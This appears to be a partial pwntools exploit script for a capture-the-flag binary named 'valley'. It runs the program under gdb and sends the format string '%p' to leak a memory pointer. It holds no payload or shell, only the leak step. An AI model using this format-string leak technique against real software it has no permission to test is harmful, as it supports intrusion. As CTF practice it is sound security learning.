from pwn import *

# change this with the actual filename
exe = ELF("./valley")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

# Context setup
context.log_level = 'debug'
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]  # For debugging in tmux
global p

def conn():
    p = gdb.debug(exe.path, gdbscript="""
        set disassembly-flavor intel
        set pagination off
    """)
    return p


def leak(input):
    p.recvuntil("Shouting: \n")
    p.sendline(input)
    p.recvuntil("0x")
    return p.recvline()


p = conn()

print(leak("%p"))

p.interactive() # Keep interaction open
